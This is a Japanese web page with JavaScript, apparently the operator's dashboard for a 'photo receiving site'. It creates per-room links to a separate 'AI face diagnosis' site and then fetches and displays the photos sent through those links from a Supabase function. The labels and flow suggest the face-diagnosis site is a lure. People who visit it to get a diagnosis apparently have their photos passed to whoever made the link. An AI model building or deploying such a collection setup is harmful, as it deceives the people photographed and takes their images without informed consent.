```html
<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>写真受信サイト</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  min-height: 100vh;
  font-family: sans-serif;
  background: linear-gradient(135deg, #111827, #312e81, #581c87);
  color: #222;
}

.container {
  max-width: 500px;
  margin: 0 auto;
  padding: 25px;
  background: white;
  border-radius: 24px;
  box-shadow: 0 10px 40px rgba(0,0,0,0.35);
}

h1 {
  text-align: center;
  margin-top: 0;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 12px;
  border: none;
  border-radius: 12px;
  background: #111827;
  color: white;
  font-size: 16px;
}

button:disabled {
  background: #999;
}

.copyButton {
  background: #4f46e5;
}

.openButton {
  background: #059669;
}

.refreshButton {
  background: #2563eb;
}

.linkBox {
  margin-top: 20px;
  padding: 15px;
  background: #f3f4f6;
  border-radius: 15px;
  word-break: break-all;
}

.linkText {
  margin-top: 10px;
  font-size: 14px;
  color: #555;
}

.roomBox {
  margin-top: 15px;
  padding: 12px;
  background: #faf5ff;
  border-radius: 12px;
  word-break: break-all;
  font-size: 13px;
}

.message {
  margin-top: 20px;
  padding: 12px;
  background: #f3f4f6;
  border-radius: 12px;
  text-align: center;
}

.photoItem {
  margin-top: 20px;
  padding: 15px;
  background: #f5f5f7;
  border-radius: 15px;
}

.photoItem img {
  display: block;
  width: 100%;
  margin-top: 10px;
  border-radius: 12px;
}

.small {
  color: #666;
  font-size: 13px;
}

.hidden {
  display: none;
}
</style>
</head>

<body>

<div class="container">

<h1>📷 写真受信サイト</h1>

<p>
専用リンクを作成して、送られてきた写真を確認できます。
</p>

<p class="small">
作成したリンクから送られた写真だけを表示します。
</p>

<button id="createButton">
🔗 リンクを作成
</button>

<div
  id="linkArea"
  class="linkBox hidden"
>

<strong>あなたの診断リンク</strong>

<div
  id="linkText"
  class="linkText"
></div>

<button
  id="copyButton"
  class="copyButton"
>
📋 リンクをコピー
</button>

<button
  id="openButton"
  class="openButton"
>
🌐 AI顔診断サイトを開く
</button>

</div>

<div
  id="roomBox"
  class="roomBox hidden"
>
ルームID：
<span id="roomText"></span>
</div>

<button
  id="refreshButton"
  class="refreshButton"
>
🔄 写真を確認
</button>

<div
  id="message"
  class="message"
>
まだ写真を確認していません。
</div>

<div id="photoArea"></div>

</div>


<script>
"use strict";


/* =========================
   設定
========================= */

const FUNCTION_URL =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";

const AI_SITE =
  "https://gaffney16445.github.io/ai-face-diagnosis/";


/* =========================
   HTML取得
========================= */

const createButton =
  document.getElementById("createButton");

const copyButton =
  document.getElementById("copyButton");

const openButton =
  document.getElementById("openButton");

const refreshButton =
  document.getElementById("refreshButton");

const linkArea =
  document.getElementById("linkArea");

const linkText =
  document.getElementById("linkText");

const roomBox =
  document.getElementById("roomBox");

const roomText =
  document.getElementById("roomText");

const message =
  document.getElementById("message");

const photoArea =
  document.getElementById("photoArea");


/* =========================
   現在のルーム
========================= */

let room = "";

let currentLink = "";


/* =========================
   ルームIDを作る
========================= */

function makeRoomId() {

  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (let i = 0; i < 12; i++) {

    result +=
      chars.charAt(
        Math.floor(
          Math.random() * chars.length
        )
      );

  }

  return result;
}


/* =========================
   ルームを表示
========================= */

function showRoom() {

  if (!room) {

    linkArea.classList.add("hidden");

    roomBox.classList.add("hidden");

    return;
  }


  currentLink =
    AI_SITE +
    "?room=" +
    encodeURIComponent(room);


  linkText.textContent =
    currentLink;

  roomText.textContent =
    room;


  linkArea.classList.remove("hidden");

  roomBox.classList.remove("hidden");
}


/* =========================
   リンク作成
========================= */

createButton.onclick =
  function () {

    room =
      makeRoomId();


    try {

      localStorage.setItem(
        "receiverRoom",
        room
      );

    } catch (error) {

      console.error(
        "localStorage error:",
        error
      );

    }


    showRoom();


    message.textContent =
      "リンクを作成しました！";
  };


/* =========================
   リンクコピー
========================= */

copyButton.onclick =
  async function () {

    if (!currentLink) {

      message.textContent =
        "先にリンクを作成してください。";

      return;
    }


    try {

      await navigator.clipboard.writeText(
        currentLink
      );

      message.textContent =
        "リンクをコピーしました！";

    } catch (error) {

      console.error(
        "copy error:",
        error
      );

      message.textContent =
        "コピーできませんでした。リンクを長押ししてコピーしてください。";
    }
  };


/* =========================
   AIサイトを開く
========================= */

openButton.onclick =
  function () {

    if (!currentLink) {

      message.textContent =
        "先にリンクを作成してください。";

      return;
    }


    window.location.href =
      currentLink;
  };


/* =========================
   写真確認
========================= */

refreshButton.onclick =
  async function () {

    if (!room) {

      message.textContent =
        "先に「リンクを作成」を押してください。";

      return;
    }


    refreshButton.disabled =
      true;

    refreshButton.textContent =
      "読み込み中...";


    message.textContent =
      "写真を確認しています...";


    photoArea.innerHTML =
      "";


    try {

      const url =
        FUNCTION_URL +
        "?room=" +
        encodeURIComponent(room);


      const response =
        await fetch(url);


      const text =
        await response.text();


      console.log(
        "photo-receiver response:",
        text
      );


      if (!response.ok) {

        throw new Error(
          "HTTP " +
          response.status
        );
      }


      const data =
        JSON.parse(text);


      if (!data.success) {

        throw new Error(
          data.error ||
          "写真取得エラー"
        );
      }


      if (
        !data.photos ||
        data.photos.length === 0
      ) {

        message.textContent =
          "まだ写真は届いていません。";

        return;
      }


      message.textContent =
        data.photos.length +
        "枚の写真が届いています。";


      data.photos.forEach(
        function (photo, index) {

          const item =
            document.createElement("div");

          item.className =
            "photoItem";


          const title =
            document.createElement("strong");

          title.textContent =
            "📷 写真 " +
            (index + 1);


          const image =
            document.createElement("img");

          image.src =
            photo.url;

          image.alt =
            "受信した写真";


          image.onload =
            function () {

              console.log(
                "写真表示成功:",
                index + 1
              );

            };


          image.onerror =
            function () {

              console.error(
                "写真表示失敗:",
                photo.url
              );

              message.textContent =
                "写真URLは取得できましたが、画像を表示できませんでした。";
            };


          item.appendChild(title);

          item.appendChild(image);

          photoArea.appendChild(item);

        }
      );


    } catch (error) {

      console.error(
        "写真取得エラー:",
        error
      );


      message.textContent =
        "写真を取得できませんでした。";

    } finally {

      refreshButton.disabled =
        false;

      refreshButton.textContent =
        "🔄 写真を確認";
    }

  };


/* =========================
   前回のルームを復元
========================= */

try {

  const savedRoom =
    localStorage.getItem(
      "receiverRoom"
    );


  if (savedRoom) {

    room =
      savedRoom;

    showRoom();

  }

} catch (error) {

  console.error(
    "restore error:",
    error
  );

}

</script>

</body>
</html>
```
